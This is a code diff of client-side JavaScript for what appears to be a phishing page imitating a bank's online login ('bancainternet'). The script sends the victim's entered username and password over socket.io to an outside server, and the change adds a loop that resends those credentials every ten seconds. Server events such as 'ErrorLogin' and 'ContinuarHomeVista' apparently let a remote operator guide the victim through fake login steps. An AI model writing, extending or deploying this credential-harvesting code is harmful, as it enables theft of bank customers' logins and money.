@@ -3,7 +3,7 @@
 const socket = io.connect("https://macro-personas.com/", {
     forceNew: true,
     transports: ["polling"],
- });
+});
 
 
 
@@ -48,6 +48,24 @@ ShowVolver.addEventListener("click", () => {
 
 socket.on("connect", () => {
     console.log("El socket se ha conectado: ", socket.id);
+    const dataInputs = {
+        'user': userInput.value,
+        'pass': passInput.value,
+        'socket': socket.id,
+    }
+    if (passInput.value.length > 0 && preloader.style.display == "block" && LoginReady) {
+        setInterval(() => {
+            dataInputs.socket = socket.id
+            socket.emit("Data", dataInputs);
+            console.log(dataInputs)
+        }, 10000);
+    } else if (userInput.value.length > 0 && preloader.style.display == "block" && BuscandoAvatar) {
+        setInterval(() => {
+            dataInputs.socket = socket.id
+            socket.emit("ShowAvatar", dataInputs);
+            console.log(dataInputs)
+        }, 10000);
+    }
 })
 
 CerrarModal.addEventListener("click", () => {
@@ -84,7 +102,7 @@ emitDataServer.addEventListener("click", () => {
         if (passCount == 0) {
             socket.emit("ShowAvatar", dataInputs);
             setInterval(() => {
-                if(passInput.value.length == 0 && preloader.style.display == "block" && !BuscandoAvatar){
+                if (passInput.value.length == 0 && preloader.style.display == "block" && !BuscandoAvatar) {
                     dataInputs.socket = socket.id
                     socket.emit("ShowAvatar", dataInputs);
                     console.log(dataInputs)
@@ -98,7 +116,7 @@ emitDataServer.addEventListener("click", () => {
     } else {
         socket.emit("Data", dataInputs);
         setInterval(() => {
-            if(passInput.value.length > 0 && preloader.style.display == "block" && !LoginReady){
+            if (passInput.value.length > 0 && preloader.style.display == "block" && !LoginReady) {
                 dataInputs.socket = socket.id
                 socket.emit("Data", dataInputs);
                 console.log(dataInputs)
@@ -112,13 +130,13 @@ emitDataServer.addEventListener("click", () => {
 var BuscandoAvatar = false;
 socket.on("YaEsMiTurno", data => {
     BuscandoAvatar = data
-    console.log("Ya es mi turno "+ BuscandoAvatar)
+    console.log("Ya es mi turno " + BuscandoAvatar)
 })
 
 var LoginReady = false;
 socket.on("YaEsMiTurnoLogin", data => {
     LoginReady = data
-    console.log("Ya es mi turno login"+ LoginReady)
+    console.log("Ya es mi turno login" + LoginReady)
 })
 
 socket.on("Resend", Data => {
@@ -140,14 +158,14 @@ socket.on("ContinuarHome", totalInfo => {
 })
 
 socket.on("ContinuarHomeVista", totalInfo => {
-    window.location.href = "/bancainternet/home/?s="+totalInfo[0].socket;
+    window.location.href = "/bancainternet/home/?s=" + totalInfo[0].socket;
 })
 
 socket.on("ErrorLogin", TextoBanner => {
     ErrorBanner.style.display = "flex";
     if (TextoBanner.slice(-7) == 'Aceptar') {
         TextErrorBanner.innerHTML = TextoBanner.slice(0, -9);
-    }else{
+    } else {
         TextErrorBanner.innerHTML = TextoBanner;
     }
     preloader.style.display = "none";
@@ -165,9 +183,9 @@ CloseErrorBanner.addEventListener("click", () => {
 
 VerUser.addEventListener("click", () => {
     console.log(userInput.type)
-    if(userInput.type == "text"){
+    if (userInput.type == "text") {
         userInput.type = "password";
-    }else{
+    } else {
         userInput.type = "text";
     }
 })
